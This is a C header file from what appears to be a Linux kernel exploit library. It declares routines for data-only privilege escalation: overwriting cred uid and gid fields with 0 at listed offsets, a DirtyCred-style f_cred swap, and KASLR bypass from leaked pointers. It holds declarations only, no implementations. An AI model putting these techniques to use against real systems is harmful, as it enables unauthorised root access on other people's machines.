#ifndef _KPWN_DATA_ATTACK_
#define _KPWN_DATA_ATTACK_

#include <kpwn/overwrite.h>
#include <stddef.h>
#include <stdint.h>

// Data-only privilege escalation (no RIP control needed).

// Patch cred.uid/euid/gid/egid to 0 (root).
// Uses common 64-bit offsets: uid@0x04, gid@0x08, suid@0x0c, sgid@0x10,
// euid@0x14, egid@0x18, fsuid@0x1c, fsgid@0x20.
int kpwn_cred_patch_uid0(uint64_t cred_addr, kpwn_kwrite_fn write_fn,
                         void *ctx);

// Replace file->f_cred with a root cred address (DirtyCred style).
int kpwn_file_replace_f_cred(uint64_t file_addr, uint64_t root_cred_addr,
                             size_t f_cred_off, kpwn_kwrite_fn write_fn,
                             void *ctx);

// KASLR facade: compute kbase from a leaked kernel pointer.
uint64_t kpwn_kaslr_from_pipe_ops(uint64_t leaked_ops,
                                  uint64_t anon_pipe_buf_ops_off);
uint64_t kpwn_kaslr_from_func_ptr(uint64_t leaked_ptr, uint64_t known_sym_off);

#endif
